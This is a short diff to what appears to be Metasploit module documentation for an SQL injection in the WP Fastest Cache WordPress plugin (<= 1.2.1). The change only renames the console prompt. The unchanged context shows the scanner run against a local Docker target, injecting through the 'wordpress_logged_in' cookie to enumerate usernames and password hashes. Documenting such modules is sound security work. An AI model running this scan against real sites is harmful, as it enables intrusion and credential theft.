@@ -113,7 +113,7 @@ installation running **WP Fastest Cache <= 1.2.1** on a Docker environment with 
 ### Step-by-step Scenario
 
 ```bash
-msf6 auxiliary(scanner/http/wp_fastest_cache_sqli) > run http://127.0.0.1:5555
+msf auxiliary(scanner/http/wp_fastest_cache_sqli) > run http://127.0.0.1:5555
 
 [*] Performing SQL injection via the 'wordpress_logged_in' cookie...
 [*] Enumerating Usernames and Password Hashes
